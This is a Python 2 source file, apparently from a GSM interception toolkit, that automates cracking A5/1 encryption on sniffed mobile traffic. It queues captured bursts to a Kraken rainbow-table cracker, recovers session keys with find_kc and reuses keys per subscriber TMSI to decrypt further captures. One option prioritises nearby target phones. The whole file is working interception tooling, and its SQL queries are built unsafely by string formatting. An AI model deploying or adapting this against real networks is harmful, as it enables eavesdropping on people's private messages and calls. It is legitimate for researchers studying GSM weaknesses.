#!/usr/bin/env python

# niekt0@hysteria.sk, jenda@hrach.eu
# Under GNU GPL

# TODO:
# - fix SQLi (t = (insecure_string,); c.execute('SELECT * FROM vankuse WHERE paplon=?', t))
# - clean code
# - voice calls (passing cracked files to sniff), on-line monitoring
# - prioritize files that may contain interesting content based on their length
#   (ref: http://jenda.hrach.eu/brm/sms_analysis.png)
# - improve statistical analysis using A5/1 keyspace collapsing and 100-extra-rounds optimalization in Berlin table set
# - implement keystream guesser benchmark

# status in keys.db:
#  0 - new
#  1 - in queue
#  2 - key found
#  3 - failed
#  4 - plain

import socket, string, re, os, sys, ConfigParser, time, Queue, thread, getopt;
import sqlite3 as lite, fcntl;

config = ConfigParser.ConfigParser()
config.read(os.getenv('HOME') + '/.omgsm/config')
gsmpath = config.get('Main', 'GSMPATH')
gsmsession = config.get('Main', 'GSMSESSION')
gsmkrakenhost = config.get('Main', 'GSMKRAKENHOST')
gsmkrakenport = config.getint('Main', 'GSMKRAKENPORT')
kraken_job_timeout = config.getint('Main', 'GSMKRAKENJOBTIMEOUT')
burst_maxqueue=config.getint('Main', 'GSMNAPALMEXMAXBURSTQUEUE')
napalmexdelay=config.getfloat('Main', 'GSMNAPALMEXDELAY')
conf_rtdelay=config.getint('Main', 'GSMNAPALMEXRTDELAY')
dat_maxadd=config.getint('Main', 'GSMNAPALMEXMAXDATADD')
kraken_burstmaxcrack=config.getint('Main', 'GSMKRAKENMAXBURSTCRACK')

operator_config=ConfigParser.ConfigParser()
operator_config.read(os.getenv('HOME') + '/.omgsm/operators')
operator_ids=operator_config.sections();

rtdelay=2**31-1 # we *love* 32-bit unix timestamp!

# contains mapping from operators file
# dictionary op_id+'_'+option -> value
op_settings = {}

for op_id in operator_ids:
	options=operator_config.options(op_id)
	for op in options:
		op_settings[op_id+'_'+op] = operator_config.get(op_id, op)

# XXX
# to config file
# O RLY?
emptykey='0000000000000000'

newpath=gsmsession+"new/"
badpath=gsmsession+"failed/"
plainpath=gsmsession+"plain/"
crackedpath=gsmsession+"cracked/"
cflags="" # convert flags
fflags="" # find_kc flags
reusing=1
failed_reusing=0
seenfile=""

#global
serial=0
realtime=0

#stat
cracked=0
reused=0
failed=0
plain=0
start=time.time()
orphans=0
dup_results=0
bursts_recv=0

prio_uplink = 0

# make stdin a non-blocking file
fd = sys.stdin.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

def myexec(cmdline):
#	print("EXEC: %s"%cmdline)
	f=os.popen(cmdline)
	return f

def stat():
	cur.execute("select count(1) from keys where key like '%s' and status=1"%(emptykey))
	queue_dat=cur.fetchone()[0]
	tsql.execute("select count(1) from keystreams where jobnum = -1")
	queue_bursts=tsql.fetchone()[0]
	tsql.execute("select count(1) from keystreams where submitted != -1")
	jobs=tsql.fetchone()[0]
	print("C:%s F:%s P:%s R:%s DUP:%s; q:%s dats, %s ks; %s jobs; %i FPS; %.2f k/s"%(cracked,failed,plain,reused,dup_results,queue_dat,queue_bursts,jobs,(bursts_recv/(time.time()-start)*16320),(cracked/(time.time()-start))))
	try:
		line=sys.stdin.readline()
		print(line)
	except:
		pass

# cracker returned possible secret cipher state, we need to backclock the LFSRs and extract key
# 
# foundkey = A5/1 secret state; bitpos = iteration with this state
# framecount = frameno of burst on which we cracked the key
# keystream2 = other burst we use to verify that key is correct, framecount2 = frameno of <-
# datfile = file these bursts were extracted from
# uplink = 0 or 1, uplink bursts use 114 more iterations of the cipher, so we need to backclock more
def backclock(foundkey, bitpos, framecount, keystream2, framecount2, datfile, uplink):
	global cracked
	global fflags
	key=emptykey
	if(uplink == 1):
		fflags="u"
	f=myexec("%s %s %s %s %s %s %s"%(gsmpath + '/kraken/Utilities/find_kc', foundkey, bitpos, framecount, framecount2, keystream2, fflags))
	res=f.read()
	m=re.search('.*: (..) (..) (..) (..) (..) (..) (..) (..)  ... MATCHED', res)
	f.close()
	if (m):
		key=(m.group(1)+m.group(2)+m.group(3)+m.group(4)+m.group(5)+m.group(6)+m.group(7)+m.group(8)).upper()
		cracked+=1
		key_found(key,datfile)

# insert burst of guessed keystream to tsql
def insert_burst(filename, keystream, framecount, keystream2, framecount2, priority, uplink, probability):
	global serial
	if len(seenfile):
		seendb.commit()
		seencur.execute("SELECT count(1) FROM bursts WHERE burst='%s'"%keystream)
		count=seencur.fetchone()[0]
		if count>=1:
			return
	tsql.execute("SELECT count(1) FROM keystreams WHERE keystream='%s'"%keystream)
	count=tsql.fetchone()[0]
	if count>=1:
		print "Attempted to insert duplicate burst! Poor signal quality, sniffer bug?"
		return
	tsql.execute("INSERT INTO keystreams VALUES('%s','%s','%s','%s','%s','%s','%s','%s', -1, -1,'%s','%s')"%(filename,keystream,framecount,keystream2,framecount2,priority,serial,uplink,time.time(),probability))
	serial+=1

# process new datfile from session
def add_datfile(datfile, tmsi, mcnc, cellid):
	global plain
	adb=""
	trans_len=0
	there_is_uplink=0
	# hotfix, sometimes napalmex is trying to move empty file
	if (not datfile):
		return
	if not decrypt(datfile, tmsi):
		statdb="%s/stat/operators/default.db"%gsmpath # fallback to default database
		if os.path.isfile("%s/stat.db"%(gsmsession)): # session-specific DB exists
			statdb="%s/stat.db"%(gsmsession)
		elif os.path.isfile("%s/stat/operators/%s.db"%(gsmpath,mcnc)): # network-specific DB
			statdb="%s/stat/operators/%s.db"%(gsmpath,mcnc)
			if os.path.isfile("%s/stat/cells/%s-%s.db"%(gsmpath,mcnc,cellid)): # AND cell-specific -> merge
				adb="-a %s/stat/cells/%s-%s.db"%(gsmpath,mcnc,cellid)
		elif os.path.isfile("%s/stat/cells/%s-%s.db"%(gsmpath,mcnc,cellid)): # cell-specific
			statdb="%s/stat/cells/%s-%s.db"%(gsmpath,mcnc,cellid)
		f=myexec(gsmpath+"/bin/gsm_convert -s %s -f %s/%s %s %s"%(statdb,newpath,datfile,adb,cflags))

		bursts_pos=0 # burst position in frame
		prev_keystream="" # for verifying the very last burst in each frame
		prev_frameno=""
		for line in f.readlines():
			m=re.search('^(.*) S.CCH/(.).* .* (.*): (.*)', line) # 1 - probability, 2 - uplink, 3 - framenumber, 4 - guessed_keystream
			if(m):
				#print line;
				ul_group=0
				probability=m.group(1)
				if(m.group(2) == "U"):
					ul_group=1
					there_is_uplink=1
					#print "uplink"
							# if this is the first burst of the frame
							# there is no keystream to check againt yet
				if(bursts_pos%4 == 1):	# if this is the second burst of the frame
							# we need to add the first burst too
					insert_burst(datfile, prev_keystream, prev_frameno, m.group(4), m.group(3), 0, ul_group, probability)
				if(bursts_pos%4 > 0):   # and then just add the current burst
					insert_burst(datfile, m.group(4), m.group(3), prev_keystream, prev_frameno, 0, ul_group, probability)
				prev_keystream=m.group(4)
				prev_frameno=m.group(3)
				bursts_pos+=1
			m=re.search('^Total encrypted SDCCH/DL frames: (.*)', line)
			if(m):
				trans_len=m.group(1) # TODO: set priority based on this
		f.close()
		if trans_len == "0" and bursts_pos == 0:
			# no encrypted SDCCH/DL found and no keystream returned
			# assume it is all plaintext
			print("PLAIN %s"%datfile)
			os.system("mv %s/%s %s"%(newpath,datfile,plainpath))
			cur.execute("update keys set status=4 where file like '%s'"%datfile)
			plain+=1
		else:
			cur.execute("update keys set status=1 where file like '%s'"%datfile)
	if (prio_uplink and there_is_uplink): # target is near, prioritize!
		tsql.execute("UPDATE keystreams set priority=priority+1 WHERE filename like '%s'"%datfile)
	con.commit()
	sqlko_internal.commit()

# submit burst from tsql to cracker (issue "crack" command)
def submit_burst(row):
	sock.send("crack %s\n"%row[1])
	tsql.execute("update keystreams set submitted=%d where keystream like '%s';"%(int(time.time()),row[1]))
#	print "crack %s"%row[1]
# used for generating plots

# cracker finished job ("crack #1337 took 31337 msec")
def job_finished(m):
	global failed
	tsql.execute("select filename,submitted,keystream from keystreams where jobnum = '%s'"%m.group(1))
	row=tsql.fetchone()
	if row == None:
		print("Strange, cracker finished job I did not submit! jobnum = %s"%m.group(1))
		return
	if len(seenfile):
		add_seentry(row[2],seenfile)
	datfile=row[0]
	roundtrip=time.time()-row[1]
	#print "rtt=%i"%roundtrip # TODO log to file and gnuplot it!
	tsql.execute("select count(1) from keystreams where filename = '%s'"%datfile)
	if tsql.fetchone()[0] == 1:
		cur.execute("update keys set status=3 where file like '%s' and key like '%s'"%(datfile,emptykey))
		if os.path.exists("%s/%s"%(newpath,datfile)):
			failed+=1
			print("FAILED %s"%datfile)
			os.system("mv %s/%s %s"%(newpath,datfile,badpath))
		con.commit()
	tsql.execute("delete from keystreams where jobnum = %s"%m.group(1))
	sqlko_internal.commit()

# cracker found cipher secret state ("Found b00b1e555ca7efff @ 14  #1337  (table:172)")
def state_found(m):
	# 1 - secret state; 2 - bitpos; 3 - jobnum
	tsql.execute("select * from keystreams where jobnum = %d"%int(m.group(3)))
	row = tsql.fetchone()
	if row == None:
		print("Strange, cracker solved job I did not submit!")
		return
	backclock(m.group(1), m.group(2), row[2], row[3], row[4], row[0], row[7])

# backclock and verification succeeded, we recovered a key!
def key_found(key, datfile):
	global dup_results
	global cracked
	cur.execute("update keys set key='%s', status=2 where file like '%s';"%(key,datfile))
	con.commit()
	if os.path.exists("%s/%s"%(newpath,datfile)):
		cur.execute("select timestamp from keys where file like '%s';"%(datfile))
		row = cur.fetchone()
		try:
			delay = time.time() - row[0]
		except ValueError:
			delay=-1
			print("BUG")
		print("CRACKED %s, delay = %i"%(datfile, delay))
		os.system("mv %s/%s %s/"%(newpath,datfile,crackedpath))
		#myexec("/home/jenda/gsm/mysrc/bordel/run %s %s %i"%(datfile,key,delay))
		tsql.execute("delete from keystreams where filename='%s' and submitted = -1"%(datfile))
	else:
		# we have already cracked this file...
		print("DUP %s"%datfile)
		dup_results+=1
		cracked-=1

# try to decrypt a given datfile
def decrypt(datfile, tmsi):
	global reused
	cur = con.cursor()
	# XXX optimization per BTS, per time (e.g. week lasting session)
	# XXX What to do if we don't catch tmsi? Spawn forkbomb (try all keys recovered so far)?
	cur.execute("select distinct(key) from keys where key not like '%s' and tmsi like '%s' and tmsi not like '00000000'"%(emptykey, tmsi))
	while True:
		row = cur.fetchone()
		if row == None:
			break
		found=os.system(gsmpath+"/bin/gsm_convert -f %s/*/%s -k %s 2>/dev/null |grep -q KEY_OK"%(gsmsession,datfile,row[0]))
		if found == 0:
			reused+=1
			key_found(row[0], datfile)
			return True
	return False

# add a burst of guessed keystream to a "I have already cracked this!" database
def add_seentry(burst, fpath):
	seencur.execute("insert into bursts values('%s', '')"%burst)
	seendb.commit()

def usage():
	print sys.argv[0]+" [options]"
	print "By default starts automated cracking of the current session"
	print "Options:"
	print " -h, --help        This help"
	print " -u, --uplink      Prioritize cracking of files that have uplink (i.e. target phones that are close to you)"
	print " -c #, --cflags #  Provide additionat parameters to gsm_convert (e.g. -c \"-t 1 -n 100\")"
	print " -e, --seenfile    Take record of already cracked bursts and don't try them again"
	print " -r, --realtime    Try to process new captured files ASAP (reduces efficiency)"
	print ""
	print "Legacy options:"
	print " -m, --mode (latency|speed|success): Set working mode (default speed)"
	print "       latency : Minimize latency (good for voice calls)"
	print "       speed : Maximize throughput (good for a lot of data)"
	print "       success : Maximize number of cracked burst files (crack everything!)"
	print " -s filename, --single filename: Try to crack just single bursts file"
	return

try:
	opts, args = getopt.getopt(sys.argv[1:], "hc:us:rem:", ["help", "cflags=","uplink","single=","realtime","seenfile","mode"])

except getopt.GetoptError:
	usage()
	sys.exit(2)
for opt, arg in opts:
	if opt in ("-h", "--help"):
		usage()                     
		sys.exit()                  
	elif opt in ("-u", "--uplink"):
		prio_uplink = 1
	elif opt in ("-c", "--cflags"):
		cflags+=arg
	elif opt in ("-s", "--single"):
		print "Not implemented."
		sys.exit(1)
	elif opt in ("-r", "--realtime"):
		rtdelay=conf_rtdelay
	elif opt in ("-e", "--seenfile"):
		seenfile=gsmsession+'seen.db'
	elif opt in ("-m", "--mode"):
		print "Use -r for latency; speed is default and success is also implemented (-t flag of gsm_convert)."
		sys.exit(1)
		if arg == 'latency' or arg == 'speed' or arg == 'success':
			mode=arg
	else:
		assert False, "unhandled option"

# automated mode
# create keys.db if database does not exists
con = None
try:
	con=lite.connect(gsmsession+'keys.db');
#	con=lite.connect(gsmsession+'keys.db', isolation_level=None)

	cur = con.cursor()    
	cur.execute('SELECT count(1) from keys') 
	data = cur.fetchone()
    
except lite.Error, e:
	cur.execute("CREATE TABLE keys(timestamp INT, file TEXT, tmsi text, key text, status INT, cid INT, mncc INT, rxlev INT)")
	cur.execute("CREATE INDEX idx_file on keys(file);");
	cur.execute("CREATE INDEX idx_key on keys(key);");
	cur.execute("CREATE INDEX idx_status on keys(status);");
	cur.execute("CREATE INDEX idx_tmsi on keys(tmsi);"); # XXX test performance

	con.commit()

cur.execute("update keys set status=0 where status=1 and key like '%s'"%emptykey) # recovery after crash
con.commit()

# internal database 
sqlko_internal=lite.connect(":memory:");
#sqlko_internal=lite.connect(":memory:",isolation_level=None)
tsql = sqlko_internal.cursor()
tsql.execute("CREATE TABLE keystreams(filename TEXT,keystream TEXT,framecount INT,keystream2 TEXT,framecount2 INT,priority INT,serial INT,uplink INT,jobnum INT,submitted INT,firstseen INT,probability REAL)")

tsql.execute("CREATE INDEX idx_filename on keystreams(filename);");
tsql.execute("CREATE INDEX idx_keystreams on keystreams(keystream);");
tsql.execute("CREATE INDEX idx_jobnum on keystreams(jobnum);");
tsql.execute("CREATE INDEX idx_submitted on keystreams(submitted);");

sqlko_internal.commit()
#sqlko_internal.close()

if len(seenfile):
	seendb = lite.connect(seenfile);
	seencur = seendb.cursor();
	seencur.execute("CREATE TABLE IF NOT EXISTS bursts(burst TEXT, found TEXT);")
	seencur.execute("create index if not exists idx1 on bursts (burst);")

# open connection to the Kraken
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.settimeout(gsmkrakentimeout)
sock.connect((gsmkrakenhost, gsmkrakenport))

#XXX check return codes

#hack, not optimal (blocking & not timeouting)
sock.setblocking(0)
sfile=sock.makefile("rb")

#main loop
laststat=time.time()
while (1):
	# Part 1: get new files
	cur.execute("select file,tmsi,mcnc,cellid from keys where key like '%s' and status=0 and timestamp > %i order by timestamp desc limit %i"%(emptykey, time.time()-rtdelay, dat_maxadd))
	result=cur.fetchall()
	for i in range(len(result)):
		row = result[i]
		tsql.execute("select count(1) from keystreams");
		bursts_to_add=burst_maxqueue-tsql.fetchone()[0];
		if bursts_to_add > 0:
			add_datfile(row[0],row[1],row[2],row[3])

	# Part 2: send parsed bursts for cracking
	tsql.execute("select count(1) from keystreams where submitted != -1")
	to_crack=kraken_burstmaxcrack-tsql.fetchone()[0]
	while to_crack > 0: # milk the DB until we fill the job queue
		tsql.execute("select filename,keystream,MIN(serial),probability from keystreams k where submitted = -1 and priority=(select max(priority) from keystreams) group by filename order by priority desc, (select count(1) from keystreams where k.filename = filename and submitted <> -1), probability desc, serial desc limit %i"%to_crack)
		#tsql.execute("select * from keystreams where submitted = -1 group by filename order by priority desc, serial desc")
		result=tsql.fetchall()
		if len(result) == 0:
			break # okay, there is nothing more in the DB
		for i in range(len(result)):
			row = result[i]
			submit_burst(row)
			to_crack-=1
	
	sqlko_internal.commit()

	# Part 3: remove missed bursts when running realtime
	tsql.execute("delete from keystreams where firstseen < %s and submitted = -1"%(time.time()-rtdelay))

	# Part 4: read returned data from cracker & process them
	while True:
		try:
			line=sfile.readline().strip()
		except:
			line=""
			break
		m=re.search('crack #(.*) took',line)
		if(m):
			job_finished(m)
			bursts_recv+=1
		m=re.search('Found (.*) @ (.*) #(.*).*',line)
		if(m):
			state_found(m)
		m=re.search('Cracking #(.*) (.*)',line)
		if(m):
			tsql.execute("update keystreams set jobnum=%d where keystream like '%s';"%(int(m.group(1)),m.group(2)))
			sqlko_internal.commit()

	if laststat+napalmexdelay<time.time():
		stat()
		laststat=time.time()
	else: # don't do cycles more often than delay
		time.sleep(laststat+napalmexdelay-time.time())

